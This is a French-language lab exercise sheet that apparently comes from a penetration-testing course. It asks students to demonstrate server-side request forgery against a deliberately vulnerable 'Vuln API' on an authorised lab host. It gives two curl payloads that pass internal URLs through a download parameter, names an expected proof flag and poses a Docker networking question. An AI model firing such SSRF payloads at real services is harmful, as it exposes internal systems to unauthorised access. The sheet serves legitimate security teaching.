# J2-C05 — SSRF avec Vuln API

## Objectif
Prouver que Vuln API peut appeler une ressource interne.

## Cible autorisée
`http://vulnapi.target.local:5000/download`

## Commandes
```bash
curl "http://vulnapi.target.local:5000/download?url=http://internal-admin"
```

```bash
curl "http://vulnapi.target.local:5000/download?url=http://127.0.0.1:5000/health"
```

## Preuve attendue
`SSRF_INTERNAL_ACCESS_OK`, réponse `/health`, explication réseau Docker, impact, remédiation.

## Question clé
Pourquoi `internal.target.local:8088` peut fonctionner depuis Kali mais pas depuis le conteneur Vuln API ?
